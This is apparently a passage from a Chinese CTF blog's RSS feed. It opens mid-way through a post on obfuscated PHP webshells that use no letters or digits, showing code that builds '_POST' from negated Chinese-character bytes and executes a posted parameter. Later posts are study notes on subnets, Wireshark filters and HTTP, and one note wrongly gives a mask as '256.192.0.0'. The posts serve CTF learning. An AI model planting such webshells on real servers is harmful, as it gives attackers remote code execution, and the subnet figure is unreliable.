operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;始&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;俯&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;瞰&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;次&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;站&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$$_____&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这串代码的思想是先利用 php 的弱类型特性 true+true 等价于 1+1=2, 得到 1 和 2 的值，然后再通过 {} 索引的方式去取中文字符 UTF-8 编码的值并反转得到想要的字符串然后拼接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法三：自增操作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PHP 沿袭了 Perl 的习惯，在&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mi&gt;Z&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mtext&gt;时，将&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a=&amp;#x27;Z&amp;#x27;时，将&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;Z&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;时，将&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; a 变成 &#39;AA&#39;, &lt;code&gt;&#39;a&#39;++ =&amp;gt; &#39;b&#39;&lt;/code&gt; ， &lt;code&gt;&#39;b&#39;++ =&amp;gt; &#39;c&#39;&lt;/code&gt; ... 所以，我们只要能拿到一个变量，其值为 &lt;code&gt;a&lt;/code&gt; ，通过自增操作即可获得 a-z 中所有字符。&lt;/p&gt;
&lt;p&gt;获取字符串 &#39;a&#39;, 在 PHP 中，强制连接数组和字符串，数组将被转换成字符串，其值为 &#39;Array&#39;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/10/23/CTF/Web/%E7%BD%91%E7%BB%9C%E4%BD%8D%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%BD%8D/</guid>
            <title>网络位 主机位</title>
            <link>https://ly1tnt.github.io/2024/10/23/CTF/Web/%E7%BD%91%E7%BB%9C%E4%BD%8D%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%BD%8D/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Wed, 23 Oct 2024 10:23:15 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;网络位和主机位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络位和主机位&#34;&gt;#&lt;/a&gt; 网络位和主机位&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络位&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;确定网络地址，使路由器能够将数据包正确地传送到目标网络。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;划分网络中的子网，方便网络管理和提高安全性。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;2.&lt;strong&gt; 主机位&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确定具体设备的 IP 地址，使设备在网络中可以被唯一标识。&lt;/li&gt;
&lt;li&gt;确保同一子网中设备之间的通信。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ip字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip字段&#34;&gt;#&lt;/a&gt; IP 字段&lt;/h2&gt;
&lt;p&gt;扫描时使用的 IP 字段，若为 / 10，则表示前十位为网络位，后 22 位为主机位，若 IP 地址为 192.0.0.0，则表示范围为 192.0.0.0 到 192.63.255.255, 计算广播地址，将主机位全部设为 1，网络位保持不变。&lt;/p&gt;
&lt;h2 id=&#34;子网掩码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#子网掩码&#34;&gt;#&lt;/a&gt; 子网掩码&lt;/h2&gt;
&lt;p&gt;划分网络位和主机位，字段有几位就有几个 1，1 后面为 0，如 / 10 为 11111111.11000000.00000000.00000000，子网掩码为 256.192.0.0，网络地址的结果为和子网掩码与运算的结果，广播地址的结果为将网络地址的主机位的 0 换成 1 计算得来的。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/10/09/CTF/Misc/WireShark%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
            <title>WireShark使用</title>
            <link>https://ly1tnt.github.io/2024/10/09/CTF/Misc/WireShark%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Misc" scheme="https://ly1tnt.github.io/categories/CTF/Misc/" />
            <pubDate>Wed, 09 Oct 2024 19:07:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;wireshark学习笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wireshark学习笔记&#34;&gt;#&lt;/a&gt; WireShark 学习笔记&lt;/h1&gt;
&lt;h3 id=&#34;1过滤器指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1过滤器指令&#34;&gt;#&lt;/a&gt; 1. 过滤器指令&lt;/h3&gt;
&lt;p&gt;http contains &amp;quot;XX&amp;quot;&lt;/p&gt;
&lt;p&gt;http contains &amp;quot;.log&amp;quot; 查日志&lt;/p&gt;
&lt;p&gt;http contains &amp;quot;login&amp;quot; http contains &amp;quot;password&amp;quot; 查密码&lt;/p&gt;
&lt;p&gt;http.request.method==POST 一般查文件的时候筛选 POST&lt;/p&gt;
&lt;h3 id=&#34;2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2&#34;&gt;#&lt;/a&gt; 2.&lt;/h3&gt;
&lt;p&gt;注意流量在哪里发生变化&lt;/p&gt;
&lt;p&gt;使用 http、tcp 流查看&lt;/p&gt;
&lt;h3 id=&#34;3wireshark实现图片截取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3wireshark实现图片截取&#34;&gt;#&lt;/a&gt; 3.wireshark 实现图片截取&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241009190537454.png&#34; alt=&#34;image-20241009190537454&#34; /&gt;&lt;/p&gt;
&lt;p&gt;像出现这种情况，可以查看追踪流，然后选择获得原始数据，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241009190625659.png&#34; alt=&#34;image-20241009190625659&#34; /&gt;&lt;/p&gt;
&lt;p&gt;放到 010 里面&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241009190635356.png&#34; alt=&#34;image-20241009190635356&#34; /&gt;&lt;/p&gt;
&lt;p&gt;保存为图片。PNG 为 89 50 开头&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/10/06/CTF/Web/%E3%80%8A%E5%9B%BE%E8%A7%A3HTTP%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</guid>
            <title>《图解HTTP》读书笔记</title>
            <link>https://ly1tnt.github.io/2024/10/06/CTF/Web/%E3%80%8A%E5%9B%BE%E8%A7%A3HTTP%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Sun, 06 Oct 2024 17:13:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;图解http学习笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图解http学习笔记&#34;&gt;#&lt;/a&gt; 《图解 HTTP》学习笔记&lt;/h1&gt;
&lt;h2 id=&#34;第一章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一章&#34;&gt;#&lt;/a&gt; 第一章&lt;/h2&gt;
&lt;h3 id=&#34;11-12-http基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11-12-http基础&#34;&gt;#&lt;/a&gt; 1.1-1.2 HTTP 基础&lt;/h3&gt;
&lt;p&gt;Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协&lt;br /&gt;
议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流&lt;br /&gt;
程。而协议是指规则的约定。可以说 Web 是建立在 HTTP 协议上通&lt;br /&gt;
信的&lt;/p&gt;
&lt;p&gt;HTTP 协议的版本:&lt;/p&gt;
&lt;p&gt;HTTP/0.9 于 1990 年问世，无正式的标准&lt;/p&gt;
&lt;p&gt;HTTP/1.0 1996 年的 5 月公布，版本被命名为 HTTP/1.0，并记载于 RFC1945&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP/1.1&lt;/strong&gt;  1997 年 1 月公布的 HTTP/1.1 是目前 (直到现在 2024.1.3 我在工作中遇到的大部分 HTTP 仍是 1.1) 主流的 HTTP&lt;/p&gt;
&lt;p&gt;协议版本 RFC2616&lt;/p&gt;
&lt;p&gt;HTTP/2.0 新一代 HTTP 协议，至今仍未大规模使用&lt;/p&gt;
&lt;h3 id=&#34;13-15-网络基础-tcpip-与http关系密切的协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13-15-网络基础-tcpip-与http关系密切的协议&#34;&gt;#&lt;/a&gt; 1.3-1.5 网络基础 TCP/IP 与 HTTP 关系密切的协议&lt;/h3&gt;
&lt;p&gt;计算机与网络设备相互通信要基于相同方法，这一切都需要一种规则，这种规则被称之为协议。&lt;/p&gt;
&lt;p&gt;通常使用的网络（包括互联网）是在 TCP/IP 协议族的基础上运作&lt;br /&gt;
的。而 **HTTP 属于它内部的一个子集。** 这里的 TCP/IP 指互联网相关的各类协议组的总称。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004220944783.png&#34; alt=&#34;image-20241004220944783&#34; /&gt;&lt;/p&gt;
&lt;p&gt;应用层：决定了向用户提供应用服务时通信的活动。&lt;/p&gt;
&lt;p&gt;TCP/IP 协议族中预存了各类通用的应用服务，如 FTP，和 DNS 服务&lt;/p&gt;
&lt;p&gt;HTTP 协议也处于该层 (应用层)&lt;/p&gt;
&lt;p&gt;传输层：对上层应用层，提供处于网络连接中的两台计算机之间的数据&lt;br /&gt;
传输。&lt;/p&gt;
&lt;p&gt;传输层有两个性质不同的协议：TCP (传输控制协议) 和 UDP (用户数据报协议)&lt;/p&gt;
&lt;p&gt;网络层：网络层用来处理在网络上流动的数据包。该层规定了通过怎样的路径（所谓的传输路线）到达对方计&lt;br /&gt;
算机，并把数据包传送给对方。&lt;/p&gt;
&lt;p&gt;链路层：用来处理连接网络的硬件部分。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004221507228.png&#34; alt=&#34;image-20241004221507228&#34; /&gt;&lt;/p&gt;
&lt;p&gt;利用 TCP/IP 协议族进行网络通信，会根据分层顺序与对方进行通信。发送端从应用层往下走，接收端从应用层往上走。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了传输方便，在传输层（TCP 协议）把从应用层处收到的数&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;口号后转发给网络层。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;路层。这样一来，发往网络的通信请求就准备齐全了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt; 请求。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004221721144.png&#34; alt=&#34;image-20241004221721144&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层&lt;/strong&gt;&lt;br /&gt;
 ** 时会把对应的首部消去。** 这一将数据包装起来的做法叫封装。&lt;/p&gt;
&lt;p&gt;几乎所有使用网络的系统都会用到 IP (Internert Protocol) 网际协议，TCP/IP 协议族中的 IP 指的就是网际协议 &lt;strong&gt;&amp;quot;IP&amp;quot; 其实是一种协议的名称，不能与 &amp;quot;IP 地址搞混&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IP 协议的作用是把各种数据包传送给对方。其中两个重要的条件是 IP 地址和 MAC&lt;br /&gt;
 地址。IP 地址指明了节点被分配到的地址 MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。&lt;/p&gt;
&lt;p&gt;使用 ARP 协议凭借 MAC 地址进行通信&lt;/p&gt;
&lt;p&gt;IP 间的通信依赖 MAC 地址。在网络上，通信双方通常是经过多台计算机和网络设备中转&lt;br /&gt;
才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC&lt;br /&gt;
 地址来搜索下一个中转目标。这时，会采用 ARP 协议（Address&lt;br /&gt;
Resolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方&lt;br /&gt;
的 IP 地址就可以反查出对应的 MAC 地址。&lt;/p&gt;
&lt;p&gt;在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为路由选择（routing）&lt;/p&gt;
&lt;p&gt;无论哪台计算机、哪台网络设备，它们都无法全面掌握互联网中的细节。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004224402530.png&#34; alt=&#34;image-20241004224402530&#34; /&gt;&lt;/p&gt;
&lt;p&gt;按层次分，TCP 位于传输层，提供可靠的字节流服务。&lt;/p&gt;
&lt;p&gt;所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大&lt;br /&gt;
块数据分割成以报文段（segment）为单位的数据包进行管理。而可&lt;br /&gt;
靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，&lt;br /&gt;
TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够&lt;br /&gt;
确认数据最终是否送达到对方。&lt;/p&gt;
&lt;p&gt;TCP 协议采用了三次握手，握手过程中使用了 TCP 的标志（flag） —— SYN（synchronize） ACK（acknowledgement）&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004224752577.png&#34; alt=&#34;image-20241004224752577&#34; /&gt;&lt;/p&gt;
&lt;p&gt;DNS (Domain Name System) 和 HTTP 一样位于应用层的协议，是提供通过域名查找 IP 地址，或逆向从 IP 地址反查域名的服务。&lt;/p&gt;
&lt;h3 id=&#34;16各种协议与http协议之间的关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#16各种协议与http协议之间的关系&#34;&gt;#&lt;/a&gt; 1.6 各种协议与 HTTP 协议之间的关系&lt;/h3&gt;
&lt;p&gt;下图展示了 IP 协议、TCP 协议和 DNS 服务在使用 HTTP 协议的通信过程中各自发挥的作用。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004225847103.png&#34; alt=&#34;image-20241004225847103&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;url和uri&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url和uri&#34;&gt;#&lt;/a&gt; URL 和 URI&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;URL&lt;/strong&gt; (Uniform Resource Locator，统一资源定位符）是使用 Web 浏览器等访问页面时需要输入的网页地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;URI&lt;/strong&gt; (Uniform Resource Identifier，统一资源标识符) 是由某个协议方案表示的资源的&lt;strong&gt;定位标识符&lt;/strong&gt;。其中协议方案有 http、ftp、mailto、telnet、file 等，约有 30 种左右。&lt;/p&gt;
&lt;p&gt;URI 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联&lt;br /&gt;
网上所处的位置）。可见 URL 是 URI 的子集。&lt;/p&gt;
&lt;p&gt;URI 就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004231104646.png&#34; alt=&#34;image-20241004231104646&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;绝对 URI 的格式:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004231536902.png&#34; alt=&#34;image-20241004231536902&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;第二章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二章&#34;&gt;#&lt;/a&gt; 第二章&lt;/h2&gt;
&lt;h3 id=&#34;21-http-协议用于客户端和服务器端之间的通信&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-http-协议用于客户端和服务器端之间的通信&#34;&gt;#&lt;/a&gt; 2.1 HTTP 协议用于客户端和服务器端之间的通信&lt;/h3&gt;
&lt;p&gt;应用 HTTP 协议时，必定是一端担任客户端角色，另一端担任服务器端角色。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232259089.png&#34; alt=&#34;image-20241004232259089&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;22-通过请求和响应的交换达成通信&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-通过请求和响应的交换达成通信&#34;&gt;#&lt;/a&gt; 2.2 通过请求和响应的交换达成通信&lt;/h3&gt;
&lt;p&gt;HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。换句话说，肯定是先从客户端开始建立通信的，服务器端在没有接收到请求之前不会发送响应。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请求必定由客户端发出，而服务器端回复响应&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232357370.png&#34; alt=&#34;image-20241004232357370&#34; /&gt;&lt;/p&gt;
